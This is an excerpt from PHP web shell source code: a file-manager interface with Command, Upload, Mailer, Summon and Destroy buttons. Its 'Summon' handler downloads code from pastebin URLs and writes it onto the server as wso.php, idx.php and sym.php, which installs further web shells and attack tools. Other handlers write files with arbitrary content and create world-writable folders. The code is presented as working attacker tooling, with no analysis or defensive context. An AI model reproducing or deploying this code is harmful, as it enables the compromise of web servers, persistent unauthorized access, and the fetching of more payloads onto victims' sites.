...
echo "Jump to File: <font color='#ffa502'>[ <a href='?dir=$ss'>HOME</a> ]</font><br>";
echo "Current Directory: <font color='#ffa502'>";
...
echo "<br><a href='?tools=cmd'><button>Command</button></a> <a href='?up=".$dir."&tools=upl'><button>Upload</button></a> <a href='?tools=mailer'><button>Mailer</button></a> <a href='?tools=endec'><button>EN/DEC</button></a><br><a href='?newf=".$dir."&tools=newfile'><button>New File</button></a> <a href='?newd=".$dir."&tools=newdir'><button>New Folder</button></a> <a href='?sm=".$dir."&tools=summon'><button>Summon</button></a> <a href='?tools=destroy'><button><font color='#d63031'>Destroy</font></button></a>";
...
if($_GET['tools']=="cmd") {
	...
	if($_POST['submit']) {
		$list = $_POST['list'];
		if($list == "wso") {
			$put = file_put_contents("$sm/wso.php", file_get_contents("http://pastebin.com/raw/uuWW5TCY"));
			if($put) {
			...
			$put = file_put_contents("$sm/idx.php", file_get_contents("http://pastebin.com/raw/nTAZr2MY"));
			if($put) {
			...
			$put = file_put_contents("$sm/sym.php", file_get_contents("http://pastebin.com/raw/PZvihMz8"));
			if($put) {
	...
	if($_POST['create']) {
		$fname = $_POST['fname'];
		$fisi = $_POST['fisi'];
		$create = fwrite(fopen($newf."/".$fname, "w"),$fisi);
		if(!file_exists($newf."/".$fname)) {
			echo " Failed to create file!";
		} else {
			echo "<script>window.location ='?dir=".$newf."';</script>";
		}
	}
	...
	if($_POST['create']) {
		...
		$create = mkdir($newd."/".$dirname, 0777);
		if(!$create) {
			echo " Failed to create dir!";
		} else {
			echo "<script>window.location ='?dir=".$newd."';</script>";
		}
	}
